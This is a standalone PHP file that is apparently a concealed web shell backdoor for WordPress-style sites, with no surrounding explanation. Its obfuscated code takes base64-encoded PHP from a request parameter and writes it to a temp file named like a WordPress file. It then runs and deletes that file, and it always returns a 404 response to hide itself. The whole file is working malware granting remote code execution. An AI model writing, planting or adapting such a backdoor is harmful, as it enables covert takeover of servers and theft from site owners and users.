<?php
try{
$g37560=array('un'.'link','file_pu'.'t_contents','te'.'mpnam','array_'.'key_exists','base64_d'.'ecode','sys_get_tem'.'p_dir');
$e22d8a='e3e38d'.'e0';
if($g37560[3]($e22d8a,$_POST)){
$ga383a=$g37560[4]($_POST[$e22d8a]);
}elseif($g37560[3]($e22d8a,$_GET)){
$ga383a=$g37560[4]($_GET[$e22d8a]);
}else{$ga383a=null;}
if($ga383a){
$d56193=$g37560[2]($g37560[5](),'w'.'p_');
if($d56193){
$g37560[1]($d56193,'<'.'?ph'.'p '.$ga383a);
http_response_code(404);
@include_once($d56193);
@$g37560[0]($d56193);
}}
http_response_code(404);
}catch(Throwable $e){http_response_code(404);}catch(Exception $e){http_response_code(404);}
